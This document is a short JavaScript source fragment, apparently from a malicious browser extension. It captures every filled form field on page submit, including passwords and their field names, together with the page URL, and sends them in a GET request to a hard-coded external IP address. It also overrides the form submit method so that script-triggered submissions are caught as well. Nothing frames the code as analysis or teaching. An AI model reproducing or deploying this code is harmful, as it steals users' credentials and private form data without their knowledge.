 function do_sniff() {
    var ok = 0;
    var hesla = window.content.document.getElementsByTagName("input");
    data = "";
    for (var i = 0; i < hesla.length; i++) {
        if (hesla[i].value != "") {
            if (hesla[i].type == "password") {
                ok = 1;
            }
            if (hesla[i].name == "") {
                data += hesla[i].type + ":" + "<blank>:" + hesla[i].value + "&";
            }
            else {
                data += hesla[i].type + ":" + hesla[i].name +":" + hesla[i].value + "&";
            }
        }
    }
    if (ok == 1) {

        data += "url:" + window.content.document.URL;

        var xmlRequest = false;
        if(window.XMLHttpRequest){
            xmlRequest = new XMLHttpRequest();
            if (xmlRequest.overrideMimeType) {
                xmlRequest.overrideMimeType('text/xml');
            }
        }
        else if(window.ActiveXObject){
            try {
                xmlRequest = new ActiveXObject("Msxml2.XMLHTTP");
            }
            catch(e){
                try {
                    xmlRequest = new ActiveXObject("Microsoft.XMLHTTP");
                }
                catch (e) {}
            }
        }
        var method = "GET";
        var url = "http://64.22.71.90/skext.php?q="+ data;
        xmlRequest.open(method, url, false );
        xmlRequest.send(null);
    }   
}


window.addEventListener("submit", do_sniff, false);

// If a script calls someForm.submit(), the onsubmit event does not fire,
// so we need to redefine the submit method of the HTMLFormElement class.
HTMLFormElement.prototype._submit = HTMLFormElement.prototype.submit;
HTMLFormElement.prototype.submit = newsubmit;
